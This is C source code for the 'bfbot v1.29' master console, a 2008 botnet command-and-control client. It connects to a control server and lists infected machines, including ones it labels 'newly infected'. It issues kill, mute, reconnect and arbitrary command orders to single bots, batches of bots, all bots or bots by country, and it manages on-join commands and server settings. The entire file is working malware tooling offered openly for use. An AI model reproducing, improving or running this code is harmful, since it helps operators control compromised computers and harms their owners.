/*
	bfbot v1.29 master console application
	Copyright (c) 2008 by iserdo

 You can freely modify and use this application for your 
 own needs, however you are not permitted to distribute it.
*/

#include <windows.h>
#include <stdio.h>

#include "..\master-dll\master-dll.h"

char	str_event_channel[] = "EVENT";
char	str_talk_channel[] = "TALK";
BOOL	mute = FALSE;

/* which talk channels to log */
int		talk_log[] = { 6, 0 };

typedef struct _msg_format_s
{
	message_type		type;
	char				*chan;
	char				*text;
	unsigned short		color;
} msg_format_s;

msg_format_s msg_format[] = {
	{ME_QUIT, str_event_channel, "Connection has been dropped.", 0x00CF},
	{PEER_JOIN, str_event_channel, "Joined: ", 0x000A}, 
	{PEER_JOIN_NI, str_event_channel, "Joined newly infected: ", 0x002A},
	{PEER_QUIT, str_event_channel, "Quit: ", 0x000C},
	{PEER_TIMEOUT, str_event_channel, "Timed-out: ", 0x000C},
	{QUERY_TOTAL, str_event_channel, "Total clients: ", 0x0006},
	{QUERY_LIST_BASIC, str_event_channel, "Listing client: ", 0x0006,},
	{QUERY_LIST_ADV, str_event_channel, "Listing client: ", 0x0006},
	{SERVER_RESPONSE, str_event_channel, "Server: ", 0x000F},
	{SERVER_OJ_LIST, str_event_channel, "On-join command: ", 0x000F},
	{SERVER_OJ_LIST_JOB, str_event_channel, "On-join job command: ", 0x000F},
	{SERVER_QUERY_INFO, str_event_channel, "Server info: ", 0x000F},
	{SERVER_PEAK_BREACHED, str_event_channel, "New peak: ", 0x006F},
	{CLIENT_TALK, str_talk_channel, "", 0x0007},
	{NONE_ERROR, NULL, NULL, 0x0000}
};

void setcolor(unsigned short color)
{                                                  
    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hcon, color);
	
	return;
}

void msg_inc_cb(message_type type, char *data, int chan, char *org)
{
	int			i;
	SYSTEMTIME	st;

	if (mute)
		return;

	for (i = 0; msg_format[i].type != 0; i++)
	{
		if (msg_format[i].type == type)
		{
			setcolor(msg_format[i].color);
			break;
		}
	}

	if (msg_format[i].text == 0)
		return;

	GetLocalTime(&st);
	if (msg_format[i].type == CLIENT_TALK)
	{
		printf("[%02d:%02d:%02d] %s %d: %s\n", 
		st.wHour, st.wMinute, st.wSecond, msg_format[i].chan, chan, data);
		for (i = 0; talk_log[i] != 0; i++)
		{
			if (talk_log[i] == chan)
			{
				FILE		*f;
				char		buff[1024];

				sprintf(buff, "chan_%d.log", chan);
				f = fopen(buff, "ab");
				if (f)
				{
					sprintf(buff, "[%02d:%02d:%02d] %s\r\n",
						st.wHour, st.wMinute, st.wSecond, data);
					fputs(buff, f);
					fclose(f);
				}
			}
		}
	}
	else
		printf("[%02d:%02d:%02d] %s: %s%s\n", 
		st.wHour, st.wMinute, st.wSecond, msg_format[i].chan, msg_format[i].text, data);

	setcolor(0x0007);

	return;
}

void send_msg(HANDLE protocol, message_type type, char *data, url_s *url)
{
	int		len = 0;

	if (data != NULL)
	{
		len = (int)strlen(data);
		data[len - 1] = 0;
		len--;
	}

	if (!mc_send(protocol, type, data, len, url))
		printf("Error: missing parameter, incorrect url or too long message\n");

	return;
}

void print_help()
{
    printf(">>>>\n");
	
	puts("+=============================================================================+");
    puts("|  m  Mute on/off          |  r  Reconnect            |  q  Quit              |");
	puts("|-----------------------------------------------------------------------------|");
	puts("|  l  List clients (basic) |  L  List clients (adv)   |                       |");
	puts("|-----------------------------------------------------|  cc Country command   |");
	puts("|  ur Reconnect user       |  nr Reconnect <n> users  |  ar Reconnect all     |");
	puts("|  uk Kill user            |  nk Kill <n> users       |  ak Kill all          |");
	puts("|  um Mute user            |  nc Command <n> users    |  am Mute all          |");
	puts("|  uc Command user         |  uq Query user           |  ac Command all       |");
	puts("|-----------------------------------------------------------------------------|");
	puts("|  jl List onjoin commands |  ja Add onjoin command   |  jr Remove onjoin cmd |");
	puts("|-----------------------------------------------------------------------------|");
	puts("|  sr Server restart       |  sq Server quit          |  si Query server info |");
	puts("|  sg Server svar get      |  ss Server svar set      |                       |");
    puts("+=============================================================================+");

	return;
}

char *parse_url(char *buff, url_s *url)
{
	int			i;
	char		*dp = NULL;

	/* todo: make better url parser */
	for (i = 0; i < 22; i++)
	{
		if (buff[i] == '\r' || buff[i] == '\n' || buff[i] == ' ')
		{
			dp = &buff[i] + 1;
			buff[i] = 0;
			break;
		}
	}
	if (i == 22)
		return NULL;

	for (i = 0; i < 16 && buff[i] != ':'; i++)
	{
		if ((buff[i] < 0x30 || buff[i] > 0x39) && 
			buff[i] != '.' && buff[i] != ':')
			return NULL;
	}
	if (i == 16)
		return NULL;

	buff[i] = 0;
	url->port = atoi(&buff[i + 1]);

	if (url->port == 0)
		return NULL;

	url->ip = buff;

	return dp;
}

int get_confirmation()
{
	int		k, ret = 0;

	printf("Are you sure? (press y and then enter, else any other key)\n");
	k = getchar();
	if (k == 'y')
		ret = 1;

	while (k != '\r' && k != '\n')
		k = getchar();

	return ret;
}

int inputloop(HANDLE protocol)
{
	char		in[256];
	url_s		url;
	char		*o;

	print_help();

	for (;;)
	{
		//printf(">>> ");
		fflush(stdout);
		if (fgets(in, sizeof(in), stdin) == NULL) 
		{
			if (freopen("CONIN$", "r", stdin) == NULL) 
			{
				puts("Cannot switch back to console from file redirection");
				in[0] = 'q';
				in[1] = '\0';
			} 
			else 
			{
				puts("Switched back to console from file redirection");
				continue;
			}
		}

		switch (in[0])
		{
		case 'q':
			return 0;
		case 'r':
			return 1;
		case 'm':
			if (mute)
			{
				printf("Mute switched off.\n");
				mute = FALSE;
			}
			else
			{
				printf("Mute switched on.\n");
				mute = TRUE;
			}
			break;
		case 'l':
			send_msg(protocol, QUERY_LIST_BASIC, NULL, NULL);
			break;
		case 'L':
			send_msg(protocol, QUERY_LIST_ADV, NULL, NULL);
			break;
		case 'u':
			{
				if (!(o = parse_url(&in[3], &url)))
				{
					printf("Invalid url \"%s\" must be in format ip:port\n", &in[3]);
					break;
				}
				switch (in[1])
				{
				case 'r':
					send_msg(protocol, ORDER_RECONNECT_USER, NULL, &url);
					break;
				case 'k':
					send_msg(protocol, ORDER_KILL_USER, NULL, &url);
					break;
				case 'm':
					send_msg(protocol, ORDER_MUTE_USER, o, &url);
					break;
				case 'q':
					send_msg(protocol, ORDER_QUERY_USER, NULL, &url);
					break;
				case 'c':
					send_msg(protocol, ORDER_COMMAND_USER, o, &url);
					break;
				default:
					if (in[1] != '\n' && in[1] != '\r') 
					{
						printf("Invalid input %s\n", in);
					}
					print_help();
					break;
				}
			}
			break;
		case 'c':
			{
				switch (in[1])
				{
				case 'c':
					send_msg(protocol, ORDER_COMMAND_COUNTRY, &in[3], NULL);
					break;
				default:
					if (in[1] != '\n' && in[1] != '\r') 
					{
						printf("Invalid input %s\n", in);
					}
					print_help();
					break;
				}
			}
			break;
		case 'n':
			{
				switch (in[1])
				{
				case 'r':
					send_msg(protocol, ORDER_RECONNECT_N, &in[3], NULL);
					break;
				case 'k':
					send_msg(protocol, ORDER_KILL_N, &in[3], NULL);
					break;
				case 'c':
					send_msg(protocol, ORDER_COMMAND_N, &in[3], NULL);
					break;
				default:
					if (in[1] != '\n' && in[1] != '\r') 
					{
						printf("Invalid input %s\n", in);
					}
					print_help();
					break;
				}
			}
			break;
		case 'a':
			{
				switch (in[1])
				{
				case 'r':
					send_msg(protocol, ORDER_RECONNECT_ALL, NULL, NULL);
					break;
				case 'k':
					if (get_confirmation())
						send_msg(protocol, ORDER_KILL_ALL, NULL, NULL);
					break;
				case 'm':
					send_msg(protocol, ORDER_MUTE_ALL, &in[3], NULL);
					break;
				case 'c':
					send_msg(protocol, ORDER_COMMAND_ALL, &in[3], NULL);
					break;
				default:
					if (in[1] != '\n' && in[1] != '\r') 
					{
						printf("Invalid input %s\n", in);
					}
					print_help();
					break;
				}
			}
			break;
		case 'j':
			{
				switch (in[1])
				{
				case 'l':
					send_msg(protocol, SERVER_OJ_LIST, &in[3], NULL);
					break;
				case 'a':
					send_msg(protocol, SERVER_OJ_ADD, &in[3], NULL);
					break;
				case 'r':
					send_msg(protocol, SERVER_OJ_REMOVE, &in[3], NULL);
					break;
				default:
					if (in[1] != '\n' && in[1] != '\r') 
					{
						printf("Invalid input %s\n", in);
					}
					print_help();
					break;
				}
			}
			break;
		case 's':
			{
				switch (in[1])
				{
				case 'r':
					if (get_confirmation())
					{
						send_msg(protocol, SERVER_RESTART, NULL, NULL);
						return 1;
					}
					break;
				case 'q':
					if (get_confirmation())
						send_msg(protocol, SERVER_QUIT, NULL, NULL);
					break;
				case 'i':
					send_msg(protocol, SERVER_QUERY_INFO, NULL, NULL);
					break;
				case 'g':
					send_msg(protocol, SERVER_SVAR_GET, &in[3], NULL);
					break;
				case 's':
					send_msg(protocol, SERVER_SVAR_SET, &in[3], NULL);
					break;
				default:
					if (in[1] != '\n' && in[1] != '\r') 
					{
						printf("Invalid input %s\n", in);
					}
					print_help();
					break;
				}
			}
			break;
		default:
			if (in[0] != '\n' && in[0] != '\r') 
			{
				printf("Invalid input %s\n", in);
			}
			print_help();
			break;
		}
	}
}

int main(int argc, char *argv[])
{
	int					s;
	HANDLE				protocol;
	mc_connect_data_s	cd;
	int					c;

	if (argc < 4)
	{
		printf("\n\nUsage: %s [hostip] [hostport] [code] <visitor>\n\n", argv[0]);
		return 0;
	}

#ifdef _DEBUG
	Sleep(1000);
#endif

	cd.code = argv[3];
	cd.code_size = (int)strlen(argv[3]);
	cd.host = argv[1];
	cd.port = atoi(argv[2]);
	if (argc == 4)
		cd.type = MASTER;
	else
		cd.type = VISITOR;

	/* register incoming callback */
	cd.cbs.mc_rcv_cb = &msg_inc_cb;
	
	while (1)
	{
		s = mc_initialize();
		if (s < 0)
		{
			printf("Failed to initialize master client networking, error: %d\n", s);
			getchar();
			return 0;
		}
		else
			printf("Networking initialized\n");

		cd.sock = s;

		printf("Connecting to: %s:%d with code: %s\n", cd.host, cd.port, cd.code);

		protocol = mc_connect(&cd);
		if (protocol == NULL)
		{
			printf("Failed to connect to: %s:%d, put r to reconnect, any other key to quit\n", 
				cd.host, cd.port);
			c = getchar();
			if (c == 'r')
			{
				getchar();
				continue;
			}
			else
				return 0;
		}

		printf("Connected to %s:%d\n", cd.host, cd.port);

		if (!inputloop(protocol))
			break;
		mc_quit(protocol);
		printf("Reconnecting...\n");
		Sleep(1000);
	}

	mc_quit(protocol);

	return 0;
}